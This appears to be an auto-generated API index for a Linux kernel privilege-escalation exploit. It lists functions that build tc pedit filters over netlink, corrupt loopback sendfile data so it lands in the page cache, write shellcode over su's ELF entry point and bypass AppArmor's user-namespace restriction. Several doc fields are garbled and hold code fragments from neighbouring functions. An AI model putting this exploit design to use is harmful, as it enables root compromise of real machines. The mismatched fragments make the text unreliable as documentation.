# API

## packet_edit_meme.c

### find_su `static const char *find_su(void)`
- Defined: `packet_edit_meme.c:57`

### elf_entry_offset `static long elf_entry_offset(int fd)`
- Defined: `packet_edit_meme.c:72`
- Doc: static const char *find_su(void) { struct stat info; int index; for (index = 0; SU_PATHS[index]; index++) { if (stat(SU_

### write_proc_file `static void write_proc_file(const char *path, const char *value)`
- Defined: `packet_edit_meme.c:93`

### corrupt_entry `static int corrupt_entry(int su_fd, long entry_offset)`
- Defined: `packet_edit_meme.c:108`
- Doc: Runs in the unshare()d child: map to uid 0, then write the shellcode over su's * entry, slot by slot, through the page-c

### run_exploit `static int run_exploit(void)`
- Defined: `packet_edit_meme.c:138`

### apparmor_userns_bypass `static void apparmor_userns_bypass(char *self)`
- Defined: `packet_edit_meme.c:211`

### main `int main(int argc, char **argv)`
- Defined: `packet_edit_meme.c:230`

## pedit_primitive.c

### request_begin `static void request_begin(int type, int flags)`
- Defined: `pedit_primitive.c:108`

### request_reserve `static void *request_reserve(int length)`
- Defined: `pedit_primitive.c:118`

### request_append `static void request_append(const void *data, int length)`
- Defined: `pedit_primitive.c:126`

### request_attr `static void request_attr(int type, const void *data, int length)`
- Defined: `pedit_primitive.c:131`

### request_attr_str `static void request_attr_str(int type, const char *text)`
- Defined: `pedit_primitive.c:140`

### request_nest_begin `static struct rtattr *request_nest_begin(int type)`
- Defined: `pedit_primitive.c:145`

### request_blob_begin `static struct rtattr *request_blob_begin(int type)`
- Defined: `pedit_primitive.c:157`
- Doc: like request_nest_begin but without NLA_F_NESTED -- for the ematch entry whose * payload is a raw tcf_ematch_hdr followe

### request_nest_end `static void request_nest_end(struct rtattr *attr)`
- Defined: `pedit_primitive.c:165`

### request_send `static int request_send(int allow_enoent)`
- Defined: `pedit_primitive.c:170`

### link_up `static int link_up(int index)`
- Defined: `pedit_primitive.c:193`
- Doc: return -1; received = recv(netlink_fd, reply_buf, sizeof(reply_buf), 0); if (received < 0) return -1; reply = (struct nl

### clsact_delete `static void clsact_delete(int index)`
- Defined: `pedit_primitive.c:225`

### clsact_add `static int clsact_add(int index)`
- Defined: `pedit_primitive.c:239`

### append_pktlen_ematch `static void append_pktlen_ematch(uint32_t threshold)`
- Defined: `pedit_primitive.c:258`
- Doc: request_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL); memset(&msg, 0, sizeof(msg)); msg.tcm_family = AF_UNSPEC; msg.tc

### append_pedit_action `static void append_pedit_action(const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:295`
- Doc: Emit one pedit action entry (kind + selector + per-key extensions) into the * action-list nest that the caller has alrea

### egress_pedit_add `static int egress_pedit_add(int index, const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:342`
- Doc: Install the egress pedit filter. Prefer the basic classifier scoped by a pkt_len ematch (only the data skb is touched, n

### fill_ihl_key `static void fill_ihl_key(struct pedit_key_spec *key)`
- Defined: `pedit_primitive.c:373`
- Doc: action_list = request_nest_begin(TCA_MATCHALL_ACT); } else { request_attr_str(TCA_KIND, "basic"); options = request_nest

### pedit_burst `static int pedit_burst(int src_fd, const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:384`
- Doc: sendfile src_fd over a fresh loopback connection, arming `keys` on lo egress * only AFTER the handshake so the corruptio

### calibrate `static int calibrate(void)`
- Defined: `pedit_primitive.c:437`
- Doc: Land a marker at a known key offset and read it back so api_fd_write() can * translate a file offset into the matching p

### setup `int setup(void)`
- Defined: `pedit_primitive.c:487`
- Doc: buf[index_iter + 3] == CALIB_MARK_BYTE) { landed = index_iter; break; } } close(fd); unlink(CALIB_PATH); if (landed < 0)

### api_fd_write `int api_fd_write(int fd, off_t offset, const void *src, size_t size)`
- Defined: `pedit_primitive.c:521`

## test_cve.c

### make_source `static void make_source(int call, off_t offset, uint8_t *src, size_t size)`
- Defined: `test_cve.c:35`

### create_target `static int create_target(void)`
- Defined: `test_cve.c:45`

### main `int main(void)`
- Defined: `test_cve.c:65`
